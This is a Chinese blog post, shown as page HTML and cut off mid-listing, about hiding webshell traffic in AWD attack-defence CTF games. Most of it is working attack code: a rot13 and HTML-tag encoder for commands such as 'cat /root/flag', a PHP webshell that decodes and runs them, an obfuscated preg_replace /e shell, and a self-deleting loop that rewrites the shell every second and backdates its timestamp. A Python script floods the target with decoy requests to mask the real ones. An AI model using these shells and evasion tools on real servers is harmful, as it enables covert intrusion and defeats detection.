@@ -1,0 +1,573 @@
+
+ <!DOCTYPE HTML>
+<html lang="cn-zh">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>AWD流量混淆 | GetFlag&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="GetFlag">
+    
+
+    
+    <meta name="description" content="题目取得有点标题党，其实只是自己当时的一个想法，去实现了一遍，只有简单的一个混淆的脚本，水平比较有限，所以很多地方实现的并不是比较合理，写这篇文章的目的主要是提供思路的参考">
+<meta name="keywords" content="AWD,流量混淆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD流量混淆">
+<meta property="og:url" content="http://flag0.com/2018/09/15/AWD流量混淆/index.html">
+<meta property="og:site_name" content="GetFlag&#39;s Blog">
+<meta property="og:description" content="题目取得有点标题党，其实只是自己当时的一个想法，去实现了一遍，只有简单的一个混淆的脚本，水平比较有限，所以很多地方实现的并不是比较合理，写这篇文章的目的主要是提供思路的参考">
+<meta property="og:locale" content="cn-zh">
+<meta property="og:image" content="http://flag0.com/img/images/AWD流量混淆/1536939430312.png">
+<meta property="og:image" content="http://flag0.com/img/images/AWD流量混淆/1536939503331.png">
+<meta property="og:image" content="http://flag0.com/img/images/AWD流量混淆/1536941215717.png">
+<meta property="og:updated_time" content="2018-10-04T16:16:47.675Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="AWD流量混淆">
+<meta name="twitter:description" content="题目取得有点标题党，其实只是自己当时的一个想法，去实现了一遍，只有简单的一个混淆的脚本，水平比较有限，所以很多地方实现的并不是比较合理，写这篇文章的目的主要是提供思路的参考">
+<meta name="twitter:image" content="http://flag0.com/img/images/AWD流量混淆/1536939430312.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="GetFlag&#39;s Blog">GetFlag&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:flag0.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/09/15/AWD流量混淆/" title="AWD流量混淆" itemprop="url">AWD流量混淆</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
+		
+  <p class="article-time">
+    <time datetime="2018-09-14T16:00:00.000Z" itemprop="datePublished"> 发表于 2018-09-15</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-混淆原理"><span class="toc-number">1.</span> <span class="toc-text">0x01 混淆原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-编码与解码"><span class="toc-number">2.</span> <span class="toc-text">0x02 编码与解码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-流量混淆"><span class="toc-number">3.</span> <span class="toc-text">0x03 流量混淆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-混淆马"><span class="toc-number">4.</span> <span class="toc-text">0x04 混淆马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-完整代码"><span class="toc-number">5.</span> <span class="toc-text">0x05 完整代码</span></a></li></ol>
+		
+		</div>
+		
+		<p>题目取得有点标题党，其实只是自己当时的一个想法，去实现了一遍，只有简单的一个混淆的脚本，水平比较有限，所以很多地方实现的并不是比较合理，写这篇文章的目的主要是提供思路的参考<br><a id="more"></a></p>
+<h2 id="0x01-混淆原理"><a href="#0x01-混淆原理" class="headerlink" title="0x01 混淆原理"></a>0x01 混淆原理</h2><p>原理非常简单，利用了<code>strip_tags</code>和<code>rot13</code>算法</p>
+<p>将正常的payload编码成类似的模样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&lt;p&gt;u&lt;a&gt;c&lt;head&gt;v&lt;a&gt;a&lt;head&gt;s&lt;body&gt;b&lt;head&gt;(&lt;head&gt;)&lt;span&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在在一句话木马处设置解码函数</p>
+<p>进行解码</p>
+<p>循环遍历Web目录下所有的php文件，匹配所有的请求的函数名，然后随机发送经过编码后的混淆数据，以达到流量混淆的目的</p>
+<p>效果图</p>
+<p><img src="\img\images\AWD流量混淆\1536939430312.png" alt="1536939430312"></p>
+<p>标红的位置是利用webshell的流量，其余的全是混淆流量</p>
+<p>利用webshell的流量包内容如下</p>
+<p><img src="\img\images\AWD流量混淆\1536939503331.png" alt="1536939503331"></p>
+<h2 id="0x02-编码与解码"><a href="#0x02-编码与解码" class="headerlink" title="0x02 编码与解码"></a>0x02 编码与解码</h2><p>核心为攻击流量的编码和<code>webshell</code>端的解码部分</p>
+<p><strong>encode.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s, OffSet=<span class="number">13</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encodeCh</span><span class="params">(ch)</span>:</span></span><br><span class="line">        f=<span class="keyword">lambda</span> x: chr((ord(ch)-x+OffSet) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">return</span> f(<span class="number">97</span>) <span class="keyword">if</span> ch.islower() <span class="keyword">else</span> (f(<span class="number">65</span>) <span class="keyword">if</span> ch.isupper() <span class="keyword">else</span> ch)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">listhtml = [<span class="string">"&lt;p&gt;"</span>,<span class="string">"&lt;body&gt;"</span>,<span class="string">"&lt;head&gt;"</span>,<span class="string">"&lt;a&gt;"</span>,<span class="string">"&lt;span&gt;"</span>,<span class="string">"&lt;br&gt;"</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tags</span><span class="params">(str)</span>:</span></span><br><span class="line">    string = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        i+=listhtml[random.randint(<span class="number">0</span>,len(listhtml)<span class="number">-1</span>)]</span><br><span class="line">        string+=i</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tags(rot13((str)))</span><br></pre></td></tr></table></figure>
+<p>使用encode对payload进行编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(encode(<span class="string">"cat /root/flag"</span>))</span><br><span class="line"></span><br><span class="line">输出结果</span><br><span class="line">p&lt;span&gt;n&lt;body&gt;g&lt;span&gt; &lt;br&gt;/&lt;br&gt;e&lt;body&gt;b&lt;span&gt;b&lt;br&gt;g&lt;span&gt;/&lt;head&gt;s&lt;body&gt;y&lt;a&gt;n&lt;br&gt;t&lt;body&gt;</span><br></pre></td></tr></table></figure>
+<p>在webshell端进行解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strip_tags(str_rot13($_REQUEST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>解码效果</p>
+<p><img src="\img\images\AWD流量混淆\1536941215717.png" alt="1536941215717"></p>
+<h2 id="0x03-流量混淆"><a href="#0x03-流量混淆" class="headerlink" title="0x03 流量混淆"></a>0x03 流量混淆</h2><p>流量混淆的思路，首先遍历<code>Web</code>目录下的所有php文件，将其添加到列表<code>php_path</code>中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php_path = []  <span class="comment">#定义php文件变量列表</span></span><br><span class="line">request_list = [] <span class="comment">#定义传值参数名，变量列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">traverse</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">        fullitem = os.path.join(path,item)<span class="comment">#组合成新目录</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">".php"</span> <span class="keyword">in</span> fullitem:</span><br><span class="line">            php_path.append(fullitem)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(fullitem):</span><br><span class="line">            traverse(fullitem)</span><br></pre></td></tr></table></figure>
+<p>然后对<code>php_path</code>中的文件进行正则匹配，匹配出所有的<code>GET</code>、<code>POST</code>、<code>REQUEST</code> 的变量名，将其去重后添加到<code>request_list</code>列表中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_search</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> path:</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        通过try except 解决了编码问题</span></span><br><span class="line"><span class="string">        每个文件的编码不一定都相同</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = open(file,<span class="string">"r"</span>,encoding=<span class="string">"UTF-8"</span>).read()</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            f = open(file, <span class="string">"r"</span>, encoding=<span class="string">"GBK"</span>).read()</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        通过测试正则，解决了匹配问题</span></span><br><span class="line"><span class="string">        $,[ 在正则中本身有特殊含义</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        key_get = <span class="string">"\$_GET\['(.+?)']"</span></span><br><span class="line">        key_post = <span class="string">"\$_POST\['(.+?)']"</span></span><br><span class="line">        key_cookie = <span class="string">"\$_REQUEST\['(.+?)']"</span></span><br><span class="line"></span><br><span class="line">        key_get_re = re.compile(key_get)</span><br><span class="line">        key_post_re = re.compile(key_post)</span><br><span class="line">        key_cookie_re = re.compile(key_cookie)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(re.findall(key_get_re,f)):</span><br><span class="line">            <span class="keyword">for</span> get <span class="keyword">in</span> re.findall(key_get_re,f):</span><br><span class="line">                request_list.append(get)</span><br><span class="line">        <span class="keyword">if</span> len(re.findall(key_post_re,f)):</span><br><span class="line">            <span class="keyword">for</span> post <span class="keyword">in</span> re.findall(key_post_re,f):</span><br><span class="line">                request_list.append(post)</span><br><span class="line">        <span class="keyword">if</span> len(re.findall(key_cookie_re,f)):</span><br><span class="line">            <span class="keyword">for</span> cookie <span class="keyword">in</span> re.findall(key_cookie_re,f):</span><br><span class="line">                request_list.append(cookie)</span><br><span class="line">    request_list = list(set(request_list)) <span class="comment">#去重</span></span><br></pre></td></tr></table></figure>
+<p>随机生成混淆的字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confusion_payload</span><span class="params">()</span>:</span><span class="comment">#混淆payload函数</span></span><br><span class="line">    random_char = <span class="string">"abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></span><br><span class="line">    random_strings = <span class="string">""</span>.join(random.sample(random_char, random.randint(<span class="number">1</span>, <span class="number">186</span>)))  <span class="comment"># 此处最大值，根据字符串长度</span></span><br><span class="line">    <span class="keyword">return</span> encode(random_strings)</span><br></pre></td></tr></table></figure>
+<p>发送混淆流量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_confusion</span><span class="params">(host, req, page, variable, payload)</span>:</span><span class="comment">#混淆流量发送函数</span></span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    host = <span class="string">"http://"</span>+host</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    这里0代表GET，1代表POST，2代表COOKIE</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> req == <span class="number">0</span>:</span><br><span class="line">        url = host + <span class="string">"/"</span> + page + <span class="string">"?"</span> + variable + <span class="string">"="</span> + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url)</span><br><span class="line">            print(<span class="string">"[+]GET"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"get error"</span>)</span><br><span class="line">    <span class="keyword">elif</span> req == <span class="number">1</span>:</span><br><span class="line">        url = host+<span class="string">"/"</span>+page</span><br><span class="line">        data = &#123;</span><br><span class="line">            variable:payload,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url,data=data)</span><br><span class="line">            print(<span class="string">"[+]POST"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"post error"</span>)</span><br><span class="line">    <span class="keyword">elif</span> req == <span class="number">2</span>:</span><br><span class="line">        url = host + <span class="string">"/"</span> + page</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"cookie"</span>:variable+<span class="string">"="</span>+payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url,headers=header)</span><br><span class="line">            print(<span class="string">"[+]Cookie"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"Cookie error"</span>)</span><br></pre></td></tr></table></figure>
+<p>调用发送混淆流量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confusion</span><span class="params">(host)</span>:</span><span class="comment">#调用混淆模块,这里采用随机的方式，不发送全部流量</span></span><br><span class="line">    pagecount = []</span><br><span class="line">    num = random.randint(<span class="number">3</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> pagenum <span class="keyword">in</span> range(num):</span><br><span class="line">        page = php_path[random.randint(<span class="number">0</span>, len(php_path) - <span class="number">1</span>)]</span><br><span class="line">        page = page.replace(path + <span class="string">"\\"</span>, <span class="string">""</span>).replace(<span class="string">"\\"</span>, <span class="string">"/"</span>)</span><br><span class="line">        <span class="keyword">if</span> page <span class="keyword">not</span> <span class="keyword">in</span> pagecount:<span class="comment">#仅向未发送过的页面发送数据</span></span><br><span class="line">            pagecount.append(page)</span><br><span class="line">            req = random.randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">            payload = confusion_payload()</span><br><span class="line">            variable = request_list[random.randint(<span class="number">0</span>, len(request_list) - <span class="number">1</span>)]</span><br><span class="line">            request_confusion(host=host, req=req, page=page, variable=variable, payload=payload)</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-混淆马"><a href="#0x04-混淆马" class="headerlink" title="0x04 混淆马"></a>0x04 混淆马</h2><p>对木马也进行混淆，这里参考<code>ph</code>牛的变形<code>WebShell</code>的方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_=[];<span class="comment">/*10ae9fc7d453b0dd525d0edf2ede7961*/</span>;$_=@<span class="string">"$_"</span>;@$_=$_[<span class="string">"!"</span>==<span class="string">"@"</span>].$_[<span class="string">"!"</span>!==<span class="string">"@"</span>].$_[<span class="number">2</span>].$_[<span class="number">3</span>];$file=$_;@preg_replace(<span class="string">"/abc/e"</span>,strip_tags(str_rot13($_REQUEST[$file])),<span class="string">"abcd"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但是只适用于<code>php5.5</code>版本以上，5.5以下会报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected &apos;[&apos; in F:\phpStudy\PHPTutorial\WWW\AWD\conn.php on line 1</span><br></pre></td></tr></table></figure>
+<p>这里当然可以采用内存马来不断的写入，来达到不死混淆马的目的</p>
+<p>其中的注释部分用于检测，完整性是否被破坏</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);<span class="comment">//程序允许执行的秒数，其中将秒数设为0表示持续运行</span></span><br><span class="line">    ignore_user_abort(<span class="keyword">True</span>);<span class="comment">//设置客户端断开后，自动执行</span></span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">	$file = <span class="string">"conn.php"</span>;</span><br><span class="line">	$payload = <span class="string">'&lt;?php $_=[];/*'</span>.md5(<span class="string">"list"</span>).<span class="string">'*/;$_=@"$_";@$_=$_["!"=="@"].$_["!"!=="@"].$_[2].$_[3];$file=$_;@preg_replace("/abc/e",strip_tags(str_rot13($_REQUEST[$file])),"abcd"); ?&gt;'</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		$shelltext=file_get_contents($file);</span><br><span class="line">		<span class="keyword">if</span>(file_exists($file))&#123;</span><br><span class="line">			<span class="keyword">if</span> (!strstr ($shelltext,md5(<span class="string">"list"</span>)))</span><br><span class="line">			&#123;</span><br><span class="line">				@file_put_contents($file,$payload,FILE_APPEND);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			@file_put_contents($file,$payload);</span><br><span class="line">		&#125;</span><br><span class="line">		touch($file,mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">2016</span>));</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x05-完整代码"><a href="#0x05-完整代码" class="headerlink" title="0x05 完整代码"></a>0x05 完整代码</h2><p>之前的代码是拆分成一个一个功能模块来实现的，在最后的时候，我把它改成了面向对象的形式来实现</p>
+<p>贴上最终版代码</p>
+<p><strong>confusion.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> encode <span class="comment">#调用自写encode payload编码模块</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">confusion</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,path)</span>:</span></span><br><span class="line">        self.path = path</span><br><span class="line">        self.php_path = []  <span class="comment"># 定义php文件变量列表</span></span><br><span class="line">        self.request_list = []  <span class="comment"># 定义传值参数名，变量列表</span></span><br><span class="line">        self.traverse() <span class="comment">#获取php文件的路径</span></span><br><span class="line">        self.request_search()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">traverse</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> os.listdir(self.path):</span><br><span class="line">            self.fullitem = os.path.join(self.path,item)<span class="comment">#组合成新目录</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">".php"</span> <span class="keyword">in</span> self.fullitem:</span><br><span class="line">                self.php_path.append(self.fullitem)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(self.fullitem):</span><br><span class="line">                self.traverse(self.fullitem)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request_search</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.php_path:</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            通过try except 解决了编码问题</span></span><br><span class="line"><span class="string">            每个文件的编码不一定一致</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(file,<span class="string">"r"</span>,encoding=<span class="string">"UTF-8"</span>).read()</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                f = open(file, <span class="string">"r"</span>, encoding=<span class="string">"GBK"</span>).read()</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            通过测试正则，解决了匹配问题</span></span><br><span class="line"><span class="string">            $,[ 在正则中本身有特殊含义</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            key_get = <span class="string">"\$_GET\['(.+?)']"</span></span><br><span class="line">            key_post = <span class="string">"\$_POST\['(.+?)']"</span></span><br><span class="line">            key_cookie = <span class="string">"\$_REQUEST\['(.+?)']"</span></span><br><span class="line"></span><br><span class="line">            key_get_re = re.compile(key_get)</span><br><span class="line">            key_post_re = re.compile(key_post)</span><br><span class="line">            key_cookie_re = re.compile(key_cookie)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> len(re.findall(key_get_re,f)):</span><br><span class="line">                <span class="keyword">for</span> get <span class="keyword">in</span> re.findall(key_get_re,f):</span><br><span class="line">                    self.request_list.append(get)</span><br><span class="line">            <span class="keyword">if</span> len(re.findall(key_post_re,f)):</span><br><span class="line">                <span class="keyword">for</span> post <span class="keyword">in</span> re.findall(key_post_re,f):</span><br><span class="line">                    self.request_list.append(post)</span><br><span class="line">            <span class="keyword">if</span> len(re.findall(key_cookie_re,f)):</span><br><span class="line">                <span class="keyword">for</span> cookie <span class="keyword">in</span> re.findall(key_cookie_re,f):</span><br><span class="line">                    self.request_list.append(cookie)</span><br><span class="line"></span><br><span class="line">            self.request_list = list(set(self.request_list))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request_confusion</span><span class="params">(self,host, req, page, variable, payload)</span>:</span><span class="comment">#混淆流量发送函数</span></span><br><span class="line">        host = <span class="string">"http://"</span>+host</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        这里0代表get，1代表post，2代表cookie</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> req == <span class="number">0</span>:</span><br><span class="line">            url = host + <span class="string">"/"</span> + page + <span class="string">"?"</span> + variable + <span class="string">"="</span> + payload</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#print("ERROR GET")</span></span><br><span class="line">        <span class="keyword">elif</span> req == <span class="number">1</span>:</span><br><span class="line">            url = host+<span class="string">"/"</span>+page</span><br><span class="line">            data = &#123;</span><br><span class="line">                variable:payload,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.post(url=url,data=data,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#print("ERROR POST")</span></span><br><span class="line">        <span class="keyword">elif</span> req == <span 